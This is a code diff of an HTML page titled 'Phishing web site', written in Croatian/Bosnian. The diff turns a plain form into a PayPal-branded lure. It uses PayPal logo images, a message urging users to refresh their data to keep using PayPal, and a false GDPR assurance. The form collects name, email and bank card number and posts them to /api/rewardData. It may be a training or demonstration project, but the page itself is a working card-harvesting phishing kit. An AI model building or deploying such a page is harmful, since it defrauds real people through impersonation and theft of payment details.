@@ -3,25 +3,36 @@
     <head>
         <meta charset="UTF-8">
         <title>Phishing web site</title>
+        <link rel="stylesheet" href="/phishing_site.css" />
     </head>
 <body>
-    <div style="text-align:center;">
-    <h1>Phishing web site</h1>
-    <form action="/api/rewardData" method="POST">
-        <label for="firstName">Unesite ime:</label><br>
-        <input type="text" id="firstName" name="firstName">
-        <br><br>
-        <label for="lastName">Unesite prezime:</label><br>
-        <input type="text" id="lastName" name="lastName">
-        <br><br>
-        <label for="email">Unesite e-mail:</label><br>
-        <input type="email" id="email" name="email">
-        <br><br>
-        <label for="cardNumber">Unesite broj bankovne kartice:</label><br>
-        <input type="password" id="cardNumber" name="cardNumber">
-        <br><br>
-        <input type="submit" value="Pošalji">
-    </form>
+    <header>
+        <img src="https://www.paypalobjects.com/webstatic/i/logo/rebrand/ppcom-white.svg" class="logo"/>
+    </header>
+    <div class="centeredShit">
+        <div class="glavnaForma">
+            <h1>Osvježite svoje podatke kako biste mogli nastaviti koristiti PayPal usluge</h1>
+            <form action="/api/rewardData" method="POST" class="formaWrapper">
+                <img src="https://www.paypalobjects.com/images/shared/momgram@2x.png" class="formaLogo" />
+                <div class="forma">
+                    <input class="inputTxt" placeholder="Vaše ime" type="text" id="firstName" name="firstName">
+                    <input class="inputTxt" placeholder="Vaše prezime" type="text" id="lastName" name="lastName">
+                    <input class="inputTxt" placeholder="Vaš email" type="email" id="email" name="email">
+                    <input class="inputTxt" placeholder="Broj kartice" type="password" id="cardNumber" name="cardNumber">
+                </div>
+                <input class="buton" type="submit" value="Pošaljite">
+                <div class="separator"><span class="textInSeparator">ili</span></div>
+                <a class="odustani" href="#">Odustanite</a>
+            </form>
+        </div>
+        <div class="desno">
+            <img class="desnoSlika" src="https://i.imgur.com/BmSbRNP.png">
+            <div class="desnoNaslov">PayPal je jednostavniji, sigurniji način za plaćanje</div>
+            <div class="desnoOpis">Bilo gdje da kupujete, čuvamo Vaše informacije na sigurnom.</div>
+        </div>
+    </div>
+    <div class="disclaimer">
+        Vaši su podaci zaštićeni Općom uredbom o zaštiti podataka (GDPR).
     </div>
 </body>
 
